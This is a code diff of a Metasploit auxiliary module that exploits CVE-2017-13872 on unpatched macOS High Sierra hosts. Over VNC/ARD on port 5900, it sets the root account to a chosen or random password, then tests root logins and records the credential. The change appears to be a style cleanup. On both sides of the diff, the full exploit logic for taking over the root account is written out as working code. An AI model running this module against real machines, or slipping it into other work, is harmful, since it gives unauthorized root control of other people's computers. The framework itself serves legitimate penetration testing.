@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
@@ -11,22 +10,22 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Apple Remote Desktop Root Vulnerability',
+      'Name' => 'Apple Remote Desktop Root Vulnerability',
       'Description' => 'Enable and set root account to a chosen password on unpatched macOS High Sierra hosts with either Screen Sharing or Remote Management enabled.',
-      'References'  =>
-        [
-          ['CVE', '2017-13872'],
-          ['URL', 'https://support.apple.com/en-us/HT208315']
-        ],
-      'Author'      => 'jgor',
-      'License'     => MSF_LICENSE
+      'References' => [
+        ['CVE', '2017-13872'],
+        ['URL', 'https://support.apple.com/en-us/HT208315']
+      ],
+      'Author' => 'jgor',
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(5900),
         OptString.new('PASSWORD', [false, 'Set root account to this password', ''])
-      ])
+      ]
+    )
   end
 
   def log_credential(password)
@@ -41,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     credential_data = {
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       origin_type: :service,
       username: 'root',
       private_data: password,
@@ -59,63 +58,59 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def run_host(target_host)
-    begin
-      if datastore['PASSWORD'].empty?
-        password = Rex::Text::rand_text_alphanumeric(16)
-      else
-        password = datastore['PASSWORD']
-      end
-
-      connect
-      vnc = Rex::Proto::RFB::Client.new(sock)
-      if vnc.handshake
-        type = vnc.negotiate_authentication
-        unless type = Rex::Proto::RFB::AuthType::ARD
-          print_error("VNC server does not advertise security type ARD.")
-          return
-        end
-        print_status("Attempting authentication as root.")
-        if vnc.authenticate_with_type(type, 'root', password)
-          log_credential(password)
-          return
-        end
-      else
-        print_error("VNC handshake failed.")
-        return
-      end
-      disconnect
-
-      connect
-      vnc = Rex::Proto::RFB::Client.new(sock)
-      print_status("Testing login as root with chosen password.")
-      if vnc.handshake
-        if vnc.authenticate_with_user('root', password)
-          log_credential(password)
-          return
-        end
-      else
-        print_error("VNC handshake failed.")
-        return
-      end
-      disconnect
-
-      connect
-      vnc = Rex::Proto::RFB::Client.new(sock)
-      print_status("Testing login as root with empty password.")
-      if vnc.handshake
-        if vnc.authenticate_with_user('root', '')
-          log_credential('')
-          return
-        end
-      else
-        print_error("VNC handshake failed.")
-        return
-      end
-
-    ensure
-      disconnect
+  def run_host(_target_host)
+    if datastore['PASSWORD'].empty?
+      password = Rex::Text.rand_text_alphanumeric(16)
+    else
+      password = datastore['PASSWORD']
     end
 
+    connect
+    vnc = Rex::Proto::RFB::Client.new(sock)
+    if vnc.handshake
+      type = vnc.negotiate_authentication
+      unless (type = Rex::Proto::RFB::AuthType::ARD)
+        print_error('VNC server does not advertise security type ARD.')
+        return
+      end
+      print_status('Attempting authentication as root.')
+      if vnc.authenticate_with_type(type, 'root', password)
+        log_credential(password)
+        return
+      end
+    else
+      print_error('VNC handshake failed.')
+      return
+    end
+    disconnect
+
+    connect
+    vnc = Rex::Proto::RFB::Client.new(sock)
+    print_status('Testing login as root with chosen password.')
+    if vnc.handshake
+      if vnc.authenticate_with_user('root', password)
+        log_credential(password)
+        return
+      end
+    else
+      print_error('VNC handshake failed.')
+      return
+    end
+    disconnect
+
+    connect
+    vnc = Rex::Proto::RFB::Client.new(sock)
+    print_status('Testing login as root with empty password.')
+    if vnc.handshake
+      if vnc.authenticate_with_user('root', '')
+        log_credential('')
+        return
+      end
+    else
+      print_error('VNC handshake failed.')
+      return
+    end
+  ensure
+    disconnect
   end
 end
